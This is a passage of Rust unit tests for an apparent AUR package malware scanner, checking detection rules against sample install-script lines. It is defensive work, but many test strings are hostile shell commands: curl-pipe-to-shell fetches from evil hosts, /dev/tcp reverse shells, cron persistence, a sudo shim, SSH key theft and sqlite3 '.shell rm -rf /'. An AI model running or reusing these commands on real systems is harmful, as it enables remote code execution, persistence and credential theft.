                pattern: r"\bg?make\s+(?:-f\s*)?(?:-|/dev/stdin)(?:\s|$)".to_string(),
            }],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Review the Makefile source; building a Makefile read from stdin/a pipe runs unverified recipes.".to_string(),
            cwe_id: Some("CWE-94".to_string()),
            enabled: true,
            case_sensitive: false,
        },
    ]
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_builtin_rules() {
        let engine = RuleEngine::default();
        assert!(engine.rule_count() > 0);
    }

    #[test]
    fn test_all_builtin_rules_compile() {
        // Regression guard: every built-in rule must compile and load. A bad
        // pattern previously aborted the whole load via `?`, silently disabling
        // every rule defined after it. Assert the full set is present.
        //
        // Use a built-ins-ONLY engine here, not RuleEngine::default(): default()
        // also loads community rule files from user_rule_dirs(), so any machine
        // with a community rule installed (e.g. the shipped example.toml in
        // /usr/share/aur-scanner/rules.d/) would otherwise inflate the count and
        // fail this test for the wrong reason.
        let expected = get_builtin_rules();
        let mut engine = RuleEngine::new();
        engine
            .add_builtin_rules()
            .expect("built-in rules must all load");
        for rule in &expected {
            assert!(
                engine.get_rule(&rule.id).is_some(),
                "built-in rule {} failed to load (bad regex?)",
                rule.id
            );
        }
        assert_eq!(engine.rule_count(), expected.len());
    }

    #[test]
    fn test_match_curl_bash() {
        let engine = RuleEngine::default();
        let content = "curl https://malicious.com/script.sh | bash";
        let matches = engine.match_content(content, FileType::Pkgbuild);
        assert!(!matches.is_empty());
        assert_eq!(matches[0].rule_id, "DLE-001");
    }

    #[test]
    fn printed_message_mentioning_dotfile_is_not_flagged() {
        // Real false positive from google-chrome / vscode: a printed note that
        // mentions ~/.config must NOT trip HIDDEN-001 (it mentions a path; it
        // does not create one).
        let engine = RuleEngine::default();
        let m = engine.match_content(
            "note \"Custom flags should be put directly in: ~/.config/chrome-flags.conf\"",
            FileType::InstallScript,
        );
        assert!(
            !m.iter().any(|x| x.rule_id == "HIDDEN-001"),
            "a printed note mentioning ~/.config must not trip HIDDEN-001: {m:?}"
        );
    }

    #[test]
    fn path_prefixed_cat_heredoc_mentioning_bashrc_is_not_flagged() {
        // Issue #15: `/bin/cat <<EOF` ... ~/.bashrc ... must not trip ENV-003 /
        // HIDDEN-001. Path-prefixed pure printers are common in install scripts.
        let engine = RuleEngine::default();
        let content = "post_install() {\n  /bin/cat << EOFMSG\n\nAdd to ~/.bashrc:\n  source /usr/share/cdu/cdu.bash\n\nEOFMSG\n}\n";
        let m = engine.match_content(content, FileType::InstallScript);
        assert!(
            !m.iter()
                .any(|x| x.rule_id == "ENV-003" || x.rule_id == "HIDDEN-001"),
            "printed /bin/cat heredoc must not trip ENV-003/HIDDEN-001: {m:?}"
        );
    }

    #[test]
    fn cron_removal_does_not_trip_persist003() {
        // Issue #21: removing a stale cron entry is the safe direction.
        let engine = RuleEngine::default();
        let m = engine.match_content(
            "rm -f /etc/cron.daily/google-chrome",
            FileType::InstallScript,
        );
        assert!(
            !m.iter().any(|x| x.rule_id == "PERSIST-003"),
            "rm of a cron path must not trip PERSIST-003: {m:?}"
        );
        // But installing one still must — including indented package() bodies
        // (adversarial review: `^` without (?m) missed leading whitespace).
        for s in [
            "install -Dm644 chrome.cron /etc/cron.daily/google-chrome",
            "    install -Dm644 chrome.cron /etc/cron.daily/google-chrome",
            "cp x /etc/cron.d/x",
            "echo '* * * * * evil' > /etc/cron.d/x",
        ] {
            let m = engine.match_content(s, FileType::InstallScript);
            assert!(
                m.iter().any(|x| x.rule_id == "PERSIST-003"),
                "write into /etc/cron must trip PERSIST-003 for: {s}"
            );
        }
        // crontab write forms fire; list/remove must not (prefix `-` bug).
        for s in ["crontab -e", "crontab /tmp/mycron", "crontab ./tabs"] {
            let m = engine.match_content(s, FileType::InstallScript);
            assert!(
                m.iter().any(|x| x.rule_id == "PERSIST-003"),
                "crontab write form must fire for: {s}"
            );
        }
        for s in ["crontab -l", "crontab -r", "crontab -l -u bob"] {
            let m = engine.match_content(s, FileType::InstallScript);
            assert!(
                !m.iter().any(|x| x.rule_id == "PERSIST-003"),
                "crontab list/remove must not fire for: {s} -> {m:?}"
            );
        }
    }

    #[test]
    fn persist003_covers_the_forms_the_verb_list_missed() {
        // External review, 2.2.0-rc.1: narrowing PERSIST-003 to an enumerated
        // verb list (to stop `rm` firing, issue #21) cut past the goal. Each
        // case below installed cron persistence and matched NOTHING.
        let engine = RuleEngine::default();
        for s in [
            // The standard non-interactive install: pipe a table into stdin.
            // The file-argument pattern excludes `-` from its char class so a
            // dash-flag cannot trip it, which also excluded the bare `-`.
            "echo '* * * * * curl evil.sh|sh' | crontab -",
            "crontab -u root -",
            "printf '%s\\n' \"$CRON\" | crontab -",
            // Redirects from something other than echo/printf/cat.
            "curl -s https://evil.example/c > /etc/cron.d/pkg",
            "base64 -d payload.b64 >> /etc/cron.hourly/pkg",
            // A bare truncating redirect, no producer at all.
            "> /etc/cron.d/pkg",
            // Link and in-place edit, neither of which names a write verb.
            "ln -s /opt/pkg/evil.cron /etc/cron.d/pkg",
            "sed -i '$a * * * * * root /opt/pkg/x' /etc/cron.d/pkg",
        ] {
            let m = engine.match_content(s, FileType::InstallScript);
            assert!(
                m.iter().any(|x| x.rule_id == "PERSIST-003"),
                "cron persistence must trip PERSIST-003 for: {s} -> {m:?}"
            );
        }

        // ...and the widened patterns must not reach across a command
        // separator into an unrelated removal. Every pattern stops at `;&|`,
        // so the issue #21 guarantee still holds when the line does more than
        // one thing.
        for s in [
            "echo done > /dev/null; rm -f /etc/cron.daily/pkg",
            "cp a b && rm /etc/cron.d/pkg",
            "sed -i s/a/b/ config.txt; rm /etc/cron.d/pkg",
            "crontab -l | grep -v pkg",
            // Measured FPs from 503 live AUR PKGBUILDs, both from
            // `python-python-crontab`. First: a pkgname ENDING in `crontab`
            // followed by the next line's variable -- a command and its
            // argument share a line, so the separator must not cross one.
            "pkgname=python-python-crontab\n_name=python-crontab\n",
            // Second: the word in prose. A bare-word argument looks exactly
            // like English, so it only counts when it ends the command.
            "pkgdesc=\"Crontab module for python\"",
            "# see the crontab documentation for details",
        ] {
            let m = engine.match_content(s, FileType::InstallScript);
            assert!(
                !m.iter().any(|x| x.rule_id == "PERSIST-003"),
                "cleanup/read must stay silent for: {s} -> {m:?}"
            );
        }
    }

    #[test]
    fn atomic004_catches_the_sudo_shim_written_destination_last() {
        // External review, 2.2.0-rc.1: both patterns required either a literal
        // `~`/`/home/<user>` prefix or the token `sudo` BEFORE the destination
        // directory. Real commands put the file name last, so the natural form
        // of a Critical, hook-fail-closed rule matched nothing.
        let engine = RuleEngine::default();
        for s in [
            "cp payload /usr/local/bin/sudo",
            "install -Dm755 stealer \"$HOME/.local/bin/sudo\"",
            "install -Dm755 shim ${XDG_BIN_HOME}/sudo",
            "ln -sf /opt/pkg/shim ~/.local/bin/sudo",
            "mv shim /home/alice/.local/bin/sudo",
        ] {
            let m = engine.match_content(s, FileType::InstallScript);
            assert!(
                m.iter().any(|x| x.rule_id == "ATOMIC-004"),
                "sudo shim must trip ATOMIC-004 for: {s} -> {m:?}"
            );
        }

        // The genuine `sudo` package must stay clean: it ships sudo into
        // /usr/bin under $pkgdir, which is not a user PATH prefix. A Critical
        // false positive on the real article is worse than the residual gap.
        for s in [
            "install -Dm4755 sudo \"$pkgdir/usr/bin/sudo\"",
            "cp \"$srcdir/sudo.conf\" \"$pkgdir/etc/sudo.conf\"",
            "install -Dm644 sudoers \"$pkgdir/etc/sudoers\"",
        ] {
            let m = engine.match_content(s, FileType::InstallScript);
            assert!(
                !m.iter().any(|x| x.rule_id == "ATOMIC-004"),
                "the real sudo package must not trip ATOMIC-004 for: {s} -> {m:?}"
            );
        }
    }

    #[test]
    fn atomic_wave3_nextfile_js_and_sudo_shim_detected() {
        let engine = RuleEngine::default();
        for s in [
            "bun add nextfile-js",
            "bun add ansi-colors-nextfile-js",
            "cd /tmp && bun add ansi-colors-nextfile-js",
        ] {
            let m = engine.match_content(s, FileType::InstallScript);
            assert!(
                m.iter().any(|x| x.rule_id == "ATOMIC-001"),
                "expected ATOMIC-001 for: {s}"
            );
        }
        let m = engine.match_content(
            "install -Dm755 stealer ~/.local/bin/sudo",
            FileType::InstallScript,
        );
        assert!(
            m.iter().any(|x| x.rule_id == "ATOMIC-004"),
            "sudo shim install must trip ATOMIC-004: {m:?}"
        );
    }

    #[test]
    fn actual_write_to_home_dotfile_is_still_flagged() {
        // The fix must not blind us to a real write: a redirect into ~/.bashrc
        // is an action, not a message, and must still trip HIDDEN-001.
        let engine = RuleEngine::default();
        let m = engine.match_content("echo 'evil' >> ~/.bashrc", FileType::InstallScript);
        assert!(
            m.iter().any(|x| x.rule_id == "HIDDEN-001"),
            "a real write to ~/.bashrc must still trip HIDDEN-001: {m:?}"
        );
    }

    #[test]
    fn variable_indirection_command_is_resolved_and_flagged() {
        // audit HI-6: a fetch-exec hidden behind a shell variable used to "trip
        // nothing"; the resolve pass now exposes it to the catalog.
        let engine = RuleEngine::default();
        for content in [
            "build() {\n  x=curl\n  $x https://evil.example/p.sh | bash\n}",
            "build() {\n  dl=wget\n  $dl -qO- https://evil.example/p | sh\n}",
        ] {
            let m = engine.match_content(content, FileType::Pkgbuild);
            assert!(
                m.iter()
                    .any(|x| x.rule_id == "DLE-001" || x.rule_id == "DLE-002"),
                "variable-indirection fetch-exec must be flagged via resolve: {content:?} -> {m:?}"
            );
        }
    }

    #[test]
    fn printf_constant_behind_variable_is_resolved() {
        // `c=$(printf '\x63url')` decodes to `c=curl` (NO execution); the use then
        // resolves to a curl|bash the catalog flags.
        let engine = RuleEngine::default();
        let content = "build() {\n  c=$(printf '\\x63url')\n  $c https://evil.example/x | bash\n}";
        let m = engine.match_content(content, FileType::Pkgbuild);
        assert!(
            m.iter().any(|x| x.rule_id == "DLE-001"),
            "printf-assembled command behind a var must resolve+flag: {m:?}"
        );
    }

    #[test]
    fn resolve_does_not_fabricate_findings_on_benign_vars() {
        // FP guard: an ordinary constant assignment must not be rewritten into a
        // fetch-exec finding.
        let engine = RuleEngine::default();
        let content = "build() {\n  msg=\"see https://example.com/docs\"\n  echo \"$msg\"\n}";
        let m = engine.match_content(content, FileType::Pkgbuild);
        assert!(
            !m.iter()
                .any(|x| x.rule_id.starts_with("DLE") || x.rule_id == "EXEC-REMOTE"),
            "benign var assignment must not fabricate a fetch-exec finding: {m:?}"
        );
    }

    #[test]
    fn semicolon_inside_quoted_message_is_not_flagged() {
        // FP: a `;` *inside* the quoted echo string is literal text, not a
        // command separator. The printed `~/.config` must stay suppressed.
        let engine = RuleEngine::default();
        for line in [
            "echo \"config goes in ~/.config; may need elevated rights\"",
            "echo 'all settings live under ~/.config; see the wiki'",
            "msg \"backups: ~/.cache; logs: ~/.local/state\"",
        ] {
            let m = engine.match_content(line, FileType::InstallScript);
            assert!(
                !m.iter().any(|x| x.rule_id == "HIDDEN-001"),
                "a quoted `;` must not un-suppress HIDDEN-001: {line:?} -> {m:?}"
            );
        }
    }

    #[test]
    fn unquoted_chain_after_message_is_still_flagged() {
        // FN-guard: the quote-aware fix must NOT blind us to a real chained
        // command. An UNQUOTED `;` separates a genuine write to a home dotfile.
        let engine = RuleEngine::default();
        for line in [
            "echo \"installing\"; touch ~/.evilrc",
            "echo done && echo x >> ~/.bashrc",
            "printf 'hi'; echo \"$(curl https://evil/x)\" > ~/.profile",
        ] {
            let m = engine.match_content(line, FileType::InstallScript);
            assert!(
                m.iter().any(|x| x.rule_id == "HIDDEN-001"),
                "a real chained write to a home dotfile must trip HIDDEN-001: {line:?} -> {m:?}"
            );
        }
    }

    #[test]
    fn line_continuation_does_not_evade_curl_bash() {
        // CR-3: the pipe-to-shell is on a backslash-continuation line. The old
        // per-physical-line matcher missed this; logical-line splicing catches it
        // and reports the originating (first) physical line.
        let engine = RuleEngine::default();
        let content = "build() {\n  curl https://evil/x.sh \\\n    | bash\n}";
        let matches = engine.match_content(content, FileType::Pkgbuild);
        assert!(
            matches.iter().any(|m| m.rule_id == "DLE-001"),
            "continuation-split curl|bash must still trip DLE-001: {matches:?}"
        );
        assert!(
            matches.iter().any(|m| m.line == 2),
            "should report physical line 2"
        );
    }

    #[test]
    fn heredoc_fed_to_interpreter_is_scanned() {
        // CR-4: a heredoc fed to `bash` executes its body, so a reverse shell in
        // it must be detected (it is NOT a printed message).
        let engine = RuleEngine::default();
        let content =
            "post_install() {\n  bash <<EOF\n  bash -i >& /dev/tcp/evil.com/4444 0>&1\nEOF\n}";
        let matches = engine.match_content(content, FileType::InstallScript);
        assert!(
            matches.iter().any(|m| m.rule_id == "SHELL-001"),
            "reverse shell inside `bash <<EOF` must be caught: {matches:?}"
        );
    }

    #[test]
    fn reverse_shell_matches_hostname_and_ipv6() {
        // SHELL-001 broadened beyond dotted-quad IPv4.
        let engine = RuleEngine::default();
        for payload in [
            "bash -i >& /dev/tcp/evil.attacker.com/4444 0>&1",
            "exec 3<>/dev/tcp/0x7f000001/4444",
            "cat < /dev/tcp/dead:beef::1/9001",
        ] {
            let matches = engine.match_content(payload, FileType::Pkgbuild);
            assert!(
                matches.iter().any(|m| m.rule_id == "SHELL-001"),
                "should detect reverse shell in {payload:?}: {matches:?}"
            );
        }
    }

    #[test]
    fn case_variation_does_not_evade() {
        // Rules now compile case-insensitively by default.
        let engine = RuleEngine::default();
        let matches = engine.match_content("CURL https://evil/x | BASH", FileType::Pkgbuild);
        assert!(
            !matches.is_empty(),
            "uppercase curl|bash should still match"
        );
    }

    #[test]
    fn bare_monero_address_detected_without_keyword() {
        // HI-6c: a miner config dropping a bare 95-char Monero address with no
        // `wallet`/`xmr` keyword nearby must still trip CRYPTO-003.
        let engine = RuleEngine::default();
        let addr = "44AFFq5kSiGBoZ4NMDwYtN18obc8AemS33DBLWs3H7otXft3XjrpDtQGv7SqSsaBYBb98uNbr2VBBEt7f2wfn3RVGQBEP3A";
        let matches = engine.match_content(addr, FileType::Pkgbuild);
        assert!(
            matches.iter().any(|m| m.rule_id == "CRYPTO-003"),
            "bare Monero address should trip CRYPTO-003: {matches:?}"
        );
    }

    #[test]
    fn test_match_base64() {
        let engine = RuleEngine::default();
        let content = "echo 'payload' | base64 -d | sh";
        let matches = engine.match_content(content, FileType::Pkgbuild);
        assert!(matches.iter().any(|m| m.rule_id == "OBF-001"));
    }

    #[test]
    fn test_no_false_positive() {
        let engine = RuleEngine::default();
        let content = "make && make install";
        let matches = engine.match_content(content, FileType::Pkgbuild);
        assert!(matches.is_empty());
    }

    #[test]
    fn test_install004_language_pkg_managers_in_install_hook() {
        let engine = RuleEngine::default();
        for s in [
            "pip install requests",
            "pip3 install --user evil",
            "poetry add malware",
            "uv pip install x",
            "pdm add y",
            "cargo install backdoor",
            "go install evil.example/x@latest",
            "gem install z",
            "deno run https://evil/x.ts",
        ] {
            let m = engine.match_content(s, FileType::InstallScript);
            assert!(m.iter().any(|x| x.rule_id == "INSTALL-004"), "missed: {s}");
        }
    }

    #[test]
    fn test_install004_not_in_pkgbuild_build() {
        // Building a node/python project in build() legitimately runs these;
        // INSTALL-004 is scoped to install hooks only.
        let engine = RuleEngine::default();
        let m = engine.match_content("pip install .", FileType::Pkgbuild);
        assert!(!m.iter().any(|x| x.rule_id == "INSTALL-004"));
    }

    #[test]
    fn test_heredoc_message_not_flagged() {
        // A post_install message printed via `cat <<EOF` mentions ~/.zshrc but
        // does not modify it; ENV-003/HIDDEN-001 must not fire.
        let engine = RuleEngine::default();
        let content = "post_install() {\n    cat << EOF\nAdd this to ~/.zshrc:\n    source /usr/share/x.zsh\nEOF\n}";
        let matches = engine.match_content(content, FileType::InstallScript);
        assert!(
            !matches
                .iter()
                .any(|m| m.rule_id == "ENV-003" || m.rule_id == "HIDDEN-001"),
            "heredoc message should not trigger path rules: {matches:?}"
        );
    }

    #[test]
    fn test_redirected_heredoc_still_scanned() {
        // Writing into ~/.zshrc via a redirected heredoc IS a real modification.
        let engine = RuleEngine::default();
        let content = "cat <<EOF >> ~/.zshrc\nsource /tmp/evil\nEOF";
        let matches = engine.match_content(content, FileType::InstallScript);
        assert!(matches.iter().any(|m| m.rule_id == "ENV-003"));
    }

    #[test]
    fn test_match_atomic_malicious_package() {
        let engine = RuleEngine::default();
        // Wave 1 (npm) and wave 2 (bun) IOC package names.
        for content in [
            "npm install atomic-lockfile",
            "bun install js-digest",
            "yarn add lockfile-js",
        ] {
            let matches = engine.match_content(content, FileType::Pkgbuild);
            assert!(
                matches.iter().any(|m| m.rule_id == "ATOMIC-001"),
                "expected ATOMIC-001 for: {content}"
            );
        }
    }

    #[test]
    fn test_match_atomic_pkgmanager_in_install_hook() {
        let engine = RuleEngine::default();
        let content = "post_install() {\n    npm install atomic-lockfile\n}";
        let matches = engine.match_content(content, FileType::InstallScript);
        assert!(matches.iter().any(|m| m.rule_id == "ATOMIC-002"));
        // bun variant
        let matches = engine.match_content("bun install js-digest", FileType::InstallScript);
        assert!(matches.iter().any(|m| m.rule_id == "ATOMIC-002"));
    }

    #[test]
    fn test_match_atomic_ebpf_artifact() {
        let engine = RuleEngine::default();
        let matches =
            engine.match_content("clang -O2 -target bpf -c scales.bpf.c", FileType::Pkgbuild);
        assert!(matches.iter().any(|m| m.rule_id == "ATOMIC-003"));
    }

    #[test]
    fn test_atomic_no_false_positive_on_legit_node_build() {
        let engine = RuleEngine::default();
        // npm in a PKGBUILD build() is common for legit node packages and must
        // NOT trigger ATOMIC-002 (which is scoped to install scripts only).
        let matches = engine.match_content("npm install --offline", FileType::Pkgbuild);
        assert!(!matches.iter().any(|m| m.rule_id == "ATOMIC-002"));
    }

    #[test]
    fn test_atomic002_catches_ci_exec_dlx() {
        // FN fix: npm ci / npm exec / pnpm dlx / yarn dlx all run lifecycle or
        // remote code from an install hook and must trip ATOMIC-002.
        let engine = RuleEngine::default();
        for s in [
            "npm ci",
            "npm exec cowsay",
            "pnpm dlx some-tool",
            "yarn dlx some-tool",
        ] {
            let m = engine.match_content(s, FileType::InstallScript);
            assert!(
                m.iter().any(|x| x.rule_id == "ATOMIC-002"),
                "missed ATOMIC-002 for: {s}"
            );
        }
    }

    #[test]
    fn test_curl_pipe_dash_detected() {
        // Defect #6: the shared SHELLS constant means `curl ... | dash` now trips
        // DLE-001 (the old `(ba)?sh` could not match dash).
        let engine = RuleEngine::default();
        let m = engine.match_content("curl -fsSL https://evil/x | dash", FileType::Pkgbuild);
        assert!(
            m.iter().any(|x| x.rule_id == "DLE-001"),
            "curl|dash must trip DLE-001: {m:?}"
        );
    }

    #[test]
    fn test_curl_pipe_ash_mksh_detected() {
        // Task 4050 F2: ash (Almquist/busybox sh) and mksh were the same evasion
        // class as dash — `curl evil | ash` / `| mksh` must trip DLE-001.
        let engine = RuleEngine::default();
        for s in [
            "curl -fsSL https://evil/x | ash",
            "curl -fsSL https://evil/x | mksh",
            "wget -qO- https://evil/x | ash",
        ] {
            let m = engine.match_content(s, FileType::Pkgbuild);
            assert!(
                m.iter()
                    .any(|x| x.rule_id == "DLE-001" || x.rule_id == "DLE-002"),
                "pipe-to-{s} must trip a download-and-execute rule: {m:?}"
            );
        }
    }

    #[test]
    fn test_atomic002_catches_npx_bunx_runners() {
        // Task 4050 F1: the bare npx-style runners (`npx <pkg>` / `bunx <pkg>` /
        // `pnpx <pkg>`) fetch-and-run a package directly — the most common RCE
        // form, which the old npm-only alternation and `bunx?\s+(install|add|i|x)`
        // both missed. `explore` runs a command in a package dir.
        let engine = RuleEngine::default();
        for s in [
            "npx malicious-tool",
            "npx -y atomic-lockfile",
            "bunx cowsay",
            "pnpx some-tool",
            "npm rebuild",
            "npm explore evil -- ./run",
        ] {
            let m = engine.match_content(s, FileType::InstallScript);
            assert!(
                m.iter().any(|x| x.rule_id == "ATOMIC-002"),
                "missed ATOMIC-002 for runner: {s} -> {m:?}"
            );
        }
    }

    #[test]
    fn test_launcher_and_path_prefixed_pipe_to_shell_detected() {
        // Task 4050 exhaustive scope: a shell reached via an absolute path
        // (`/bin/sh`), a launcher word (`busybox sh`, `env sh`), a path+launcher
        // (`/usr/bin/env sh`), stacked launchers (`command busybox sh`), or any
        // member of the curated long-tail must all trip DLE-001. These produced
        // ZERO findings before.
        let engine = RuleEngine::default();
        for s in [
            "curl -fsSL https://evil/x | /bin/sh",
            "curl -fsSL https://evil/x | /usr/bin/bash",
            "curl -fsSL https://evil/x | busybox sh",
            "curl -fsSL https://evil/x | busybox ash",
            "curl -fsSL https://evil/x | env sh",
            "curl -fsSL https://evil/x | /usr/bin/env sh",
            "curl -fsSL https://evil/x | env -i sh",
            "curl -fsSL https://evil/x | env FOO=bar sh",
            "curl -fsSL https://evil/x | command busybox sh",
            "curl -fsSL https://evil/x | nice dash",
            // long-tail shells
            "curl -fsSL https://evil/x | mksh",
            "curl -fsSL https://evil/x | yash",
            "curl -fsSL https://evil/x | xonsh",
            "curl -fsSL https://evil/x | nu",
            "curl -fsSL https://evil/x | oil",
        ] {
            let m = engine.match_content(s, FileType::Pkgbuild);
            assert!(
                m.iter().any(|x| x.rule_id == "DLE-001"),
                "launcher/path/long-tail pipe-to-shell must trip DLE-001: {s} -> {m:?}"
            );
        }
        // wget variant -> DLE-002
        let m = engine.match_content("wget -qO- https://evil/x | /bin/sh", FileType::Pkgbuild);
        assert!(
            m.iter().any(|x| x.rule_id == "DLE-002"),
            "wget|/bin/sh must trip DLE-002: {m:?}"
        );
    }

    #[test]
    fn test_exec006_sqlite3_shell_exec() {
        // Task 4050 round 3 / Class 3: sqlite3 .shell/.system/.import exec form.
        let engine = RuleEngine::default();
        for s in [
            r#"sqlite3 mydb ".shell rm -rf /""#,
            r#"sqlite3 mydb ".system curl evil | sh""#,
            r#"sqlite3 db <<< '.import /etc/passwd t'"#,
        ] {
            let m = engine.match_content(s, FileType::InstallScript);
            assert!(
                m.iter().any(|x| x.rule_id == "EXEC-006"),
                "missed EXEC-006: {s} -> {m:?}"
            );
        }
        // FP: a normal query mentioning a column/table named like the meta-command.
        for ok in [
            r#"sqlite3 db "SELECT * FROM systems""#,
            r#"sqlite3 db ".tables""#,
            r#"sqlite3 db "INSERT INTO t VALUES ('data.import')""#,
        ] {
            let m = engine.match_content(ok, FileType::InstallScript);
            assert!(
                !m.iter().any(|x| x.rule_id == "EXEC-006"),
                "EXEC-006 false positive: {ok} -> {m:?}"
            );
        }
    }

    #[test]
    fn test_exec007_make_from_stdin() {
        // Task 4050 round 3 / Class 3: a Makefile read from stdin/pipe is RCE.
        let engine = RuleEngine::default();
        for s in [
            "make -f -",
            "make -f /dev/stdin",
            "gmake -f -",
            "curl https://e/x | make -f -",
        ] {
            let m = engine.match_content(s, FileType::Pkgbuild);
            assert!(
                m.iter().any(|x| x.rule_id == "EXEC-007"),
                "missed EXEC-007: {s} -> {m:?}"
            );
        }
        // FP: ordinary make invocations must stay clean.
        for ok in [
            "make -j4",
            "make -C build",
            "make --version",
            "make -f Makefile",
            "make install",
        ] {
            let m = engine.match_content(ok, FileType::Pkgbuild);
            assert!(
                !m.iter().any(|x| x.rule_id == "EXEC-007"),
                "EXEC-007 false positive: {ok} -> {m:?}"
            );
        }
    }

    #[test]
    fn test_shell_sink_no_false_positive() {
        // The launcher/path generalization must not flag a pipe whose target is
        // NOT a shell, even when a launcher word or path is present.
        let engine = RuleEngine::default();
        for s in [
            "curl -fsSL https://x | /usr/bin/tee out.txt",
            "curl -fsSL https://x | env grep foo",
            "curl -fsSL https://x | nice make",
            "curl -fsSL https://x | command ls",
            "curl -fsSL https://x | /bin/number",
            "curl -fsSL https://x | busybox cat",
            "curl -fsSL https://x | awkward-tool",
        ] {
            let m = engine.match_content(s, FileType::Pkgbuild);
            assert!(
                !m.iter().any(|x| x.rule_id == "DLE-001"),
                "non-shell pipe target must not trip DLE-001: {s} -> {m:?}"
            );
        }
    }

    #[test]
    fn env_name_rules_stay_case_sensitive() {
        // Audit HI-6 caveat: env-var NAME rules opt out of the `(?i)` default via
        // the new `case_sensitive` field, so the real upper-case env var still
        // fires while a benign lowercase local variable does not false-positive.
        let engine = RuleEngine::default();

        // ENV-002 (PATH manipulation, install scripts).
        let hit = engine.match_content("export PATH=/evil/bin:$PATH", FileType::InstallScript);
        assert!(
            hit.iter().any(|m| m.rule_id == "ENV-002"),
            "export PATH= must fire ENV-002"
        );
        let miss = engine.match_content("export path=/home/me/scratch", FileType::InstallScript);
        assert!(
            !miss.iter().any(|m| m.rule_id == "ENV-002"),
            "lowercase local `path=` must NOT fire ENV-002 (case_sensitive opt-out)"
        );

        // ENV-001 (LD_PRELOAD).
        let hit2 = engine.match_content("LD_PRELOAD=/tmp/evil.so make", FileType::Pkgbuild);
        assert!(
            hit2.iter().any(|m| m.rule_id == "ENV-001"),
            "LD_PRELOAD= must fire ENV-001"
        );
        let miss2 = engine.match_content("ld_preload=localvalue", FileType::Pkgbuild);
        assert!(
            !miss2.iter().any(|m| m.rule_id == "ENV-001"),
            "lowercase `ld_preload=` must NOT fire ENV-001 (case_sensitive opt-out)"
        );
    }

    #[test]
    fn dep003_registry_env_names_respect_canonical_case() {
        // DEP-003 mixes tokens of different canonical casing. pip/go env vars are
        // upper-case only, so a lower-case `pip_index_url=`/`goproxy=` is inert and
        // must NOT fire; the real upper-case names + npm (both cases) + flags must.
        let engine = RuleEngine::default();
        let fires = |s: &str| {
            engine
                .match_content(s, FileType::Pkgbuild)
                .iter()
                .any(|m| m.rule_id == "DEP-003")
        };
        // Real / canonical forms fire.
        assert!(
            fires("PIP_INDEX_URL=https://evil/idx pip install x"),
            "PIP_INDEX_URL= must fire"
        );
        assert!(fires("GOPROXY=https://evil go build"), "GOPROXY= must fire");
        assert!(
            fires("pip install --index-url https://evil/idx x"),
            "--index-url must fire"
        );
        // npm honours both cases, so both must fire.
        assert!(
            fires("npm_config_registry=https://evil npm i"),
            "npm_config_registry= must fire"
        );
        assert!(
            fires("NPM_CONFIG_REGISTRY=https://evil npm i"),
            "NPM_CONFIG_REGISTRY= must fire"
        );
        // Inert lower-case pip/go env vars must NOT false-positive.
        assert!(
            !fires("pip_index_url=/home/me/notes"),
            "lowercase pip_index_url= must NOT fire (inert)"
        );
        assert!(
            !fires("goproxy=somelocalnote"),
            "lowercase goproxy= must NOT fire (inert)"
        );
    }

    #[test]
    fn test_atomic002_bun_runner_not_double_reported() {
        // The `bun` subcommand pattern and the `bunx` runner pattern must not
        // both match the same line (they cover disjoint commands).
        let engine = RuleEngine::default();
        let m = engine.match_content("bunx evil-pkg", FileType::InstallScript);
        let n = m.iter().filter(|x| x.rule_id == "ATOMIC-002").count();
        assert_eq!(
            n, 1,
            "bunx runner should report ATOMIC-002 exactly once: {m:?}"
        );
    }

    #[test]
    fn test_hidden002_no_fp_on_tmpdir_and_mktemp() {
        // Defect #10: a /tmp path as an assignment value or a plain argument is
        // not execution and must not trip HIDDEN-002.
        let engine = RuleEngine::default();
        for s in [
            "TMPDIR=/tmp/mybuild",
            "export TMPDIR=/tmp/mybuild",
            "builddir=$(mktemp -d /tmp/pkg.XXXXXX)",
            "cp foo /tmp/bar",
            "cat ~/.ssh/id_rsa > /tmp/stolen",
        ] {
            let m = engine.match_content(s, FileType::InstallScript);
            assert!(
                !m.iter().any(|x| x.rule_id == "HIDDEN-002"),
                "HIDDEN-002 false positive on: {s} -> {m:?}"
            );
        }
    }

    #[test]
    fn test_hidden002_still_catches_tmp_execution() {
        // Real execution from /tmp (command position or via an interpreter) must
        // still fire.
        let engine = RuleEngine::default();
        for s in [
            "/tmp/payload.sh",
            "bash /tmp/payload",
            "make && /tmp/dropper",
            "chmod +x /tmp/x",
        ] {
            let m = engine.match_content(s, FileType::InstallScript);
            assert!(
                m.iter().any(|x| x.rule_id == "HIDDEN-002"),
                "HIDDEN-002 missed real /tmp execution: {s} -> {m:?}"
            );
        }
    }

    #[test]
    fn test_install002_no_fp_on_configure() {
        // Defect #10: `./configure` (and `cd ./build`) are not dropped-payload
        // executions and must not trip INSTALL-002.
        let engine = RuleEngine::default();
        for s in ["./configure", "./configure --prefix=/usr", "cd ./build"] {
            let m = engine.match_content(s, FileType::InstallScript);
            assert!(
                !m.iter().any(|x| x.rule_id == "INSTALL-002"),
                "INSTALL-002 false positive on: {s} -> {m:?}"
            );
        }
    }

    #[test]
    fn test_install002_still_catches_dropped_script() {
        // A relative script/binary with a payload extension run in command
        // position still fires.
        let engine = RuleEngine::default();
        for s in ["./payload.sh", "./drop/x.bin"] {
            let m = engine.match_content(s, FileType::InstallScript);
            assert!(
                m.iter().any(|x| x.rule_id == "INSTALL-002"),
                "INSTALL-002 missed dropped script: {s} -> {m:?}"
            );
        }
    }

    /// Load the shipped community rules file into a fresh engine.
    fn perm_engine() -> RuleEngine {
        let path = Path::new(env!("CARGO_MANIFEST_DIR")).join("../../install/rules.d");
        let mut engine = RuleEngine::new();
        engine
            .load_rules_from_dir(&path)
            .expect("shipped rules.d must load");
        engine
    }

    #[test]
    fn shipped_permission_rules_catch_world_writable() {
        let engine = perm_engine();
        let cases: &[(&str, &str)] = &[
            (r#"chmod 777 "$pkgdir/usr/bin/foo""#, "PERM-001"),
            (r#"chmod -R 777 "$pkgdir/opt/app""#, "PERM-001"),
            (r#"chmod 0777 "$pkgdir/opt/app""#, "PERM-001"),
            (r#"chmod 666 "$pkgdir/etc/foo.conf""#, "PERM-001"),
            (r#"chmod 757 "$pkgdir/opt/x""#, "PERM-001"),
            (r#"chmod 772 "$pkgdir/opt/x""#, "PERM-001"),
            (r#"install -Dm777 bin "$pkgdir/usr/bin/bin""#, "PERM-001"),
            (r#"install -m 666 f "$pkgdir/etc/f""#, "PERM-001"),
            (r#"chmod o+w "$pkgdir/etc/foo.conf""#, "PERM-002"),
